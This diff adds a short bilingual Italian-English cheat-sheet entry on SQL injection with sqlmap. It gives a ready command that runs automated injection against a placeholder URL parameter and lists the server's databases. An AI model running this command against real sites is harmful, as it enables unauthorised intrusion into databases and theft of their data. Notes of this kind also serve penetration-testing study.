@@ -1,0 +1,9 @@
+SQL Injection con SQLmap / SQL Injection with SQLmap
+ITA: Strumento automatico per trovare e sfruttare vulnerabilità nei database di un sito web.
+ENG: Automatic tool to find and exploit vulnerabilities in website databases.
+
+Comando:
+
+Bash
+sqlmap -u "http://sito.com/page.php?id=1" --dbs
+--dbs: Elenca tutti i database presenti sul server.
